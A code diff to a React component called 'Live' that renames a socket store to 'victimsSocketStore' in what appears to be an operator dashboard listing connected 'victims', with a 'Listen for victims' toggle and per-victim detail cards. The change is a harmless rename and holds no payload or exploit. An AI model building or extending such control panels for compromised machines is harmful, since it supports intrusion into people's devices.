@@ -20,17 +20,17 @@ import {
 } from '../../../utils/Mappings';
 
 export const Live: React.FC = observer(() => {
-    const { socketStore } = useStore();
+    const { victimsSocketStore } = useStore();
 
-    const openedVictim = socketStore.victims.find((v) => v.open);
+    const openedVictim = victimsSocketStore.victims.find((v) => v.open);
 
     useEffect(() => {
-        socketStore.connect();
+        victimsSocketStore.connect();
 
         return () => {
-            socketStore.disconnect();
+            victimsSocketStore.disconnect();
         };
-    }, [socketStore]);
+    }, [victimsSocketStore]);
 
     return (
         <>
@@ -39,13 +39,13 @@ export const Live: React.FC = observer(() => {
                     <Switch
                         label='Listen for victims'
                         labelPosition='before'
-                        disabled={socketStore.inprogress}
-                        checked={socketStore.listening}
+                        disabled={victimsSocketStore.inprogress}
+                        checked={victimsSocketStore.listening}
                         onChange={(_, data) => {
                             if (data.checked) {
-                                socketStore.startListening();
+                                victimsSocketStore.startListening();
                             } else {
-                                socketStore.stopListening();
+                                victimsSocketStore.stopListening();
                             }
                         }}
                     />
@@ -56,7 +56,8 @@ export const Live: React.FC = observer(() => {
                             info='This indicates the number of victims that are currently connected to the server.'
                             className='victims-count'
                         >
-                            Connected Victims: {socketStore.victims.length}
+                            Connected Victims:{' '}
+                            {victimsSocketStore.victims.length}
                         </InfoLabel>
                     </div>
 
@@ -65,7 +66,7 @@ export const Live: React.FC = observer(() => {
                             icon={faTowerBroadcast}
                             color={
                                 ConnectionStatusColorMap[
-                                    socketStore.connectionStatus
+                                    victimsSocketStore.connectionStatus
                                 ]
                             }
                         />
@@ -77,23 +78,25 @@ export const Live: React.FC = observer(() => {
                             Live Connection:{' '}
                             {
                                 ConnectionStatusTextMap[
-                                    socketStore.connectionStatus
+                                    victimsSocketStore.connectionStatus
                                 ]
                             }
                         </InfoLabel>
                     </div>
                 </CustomToolbar>
                 <div className='table-container'>
-                    {socketStore.victims.length > 0 ? (
+                    {victimsSocketStore.victims.length > 0 ? (
                         <div className='grid-container'>
-                            {socketStore.victims.map((victim) => (
+                            {victimsSocketStore.victims.map((victim) => (
                                 <VictimCard
                                     key={`victim-${victim.id}`}
                                     data={victim}
                                     onClick={() => {
-                                        socketStore.victims.forEach((v) => {
-                                            v.setOpen(v.id === victim.id);
-                                        });
+                                        victimsSocketStore.victims.forEach(
+                                            (v) => {
+                                                v.setOpen(v.id === victim.id);
+                                            },
+                                        );
                                     }}
                                 />
                             ))}
@@ -101,14 +104,17 @@ export const Live: React.FC = observer(() => {
                     ) : (
                         <div className='no-data'>
                             <div className='text'>
-                                {!socketStore.listening
+                                {!victimsSocketStore.listening
                                     ? 'Not listening for victims!'
                                     : 'No victims connected!'}
                             </div>
                         </div>
                     )}
                     <LoadingOverlay
-                        loading={socketStore.loading || socketStore.inprogress}
+                        loading={
+                            victimsSocketStore.loading ||
+                            victimsSocketStore.inprogress
+                        }
                     />
                 </div>
             </div>
@@ -117,7 +123,7 @@ export const Live: React.FC = observer(() => {
                 open={openedVictim !== undefined}
                 setOpen={(open) => {
                     if (openedVictim !== undefined) {
-                        socketStore.victims.forEach((v) => {
+                        victimsSocketStore.victims.forEach((v) => {
                             v.setOpen(v.id === openedVictim.id && open);
                         });
                     }
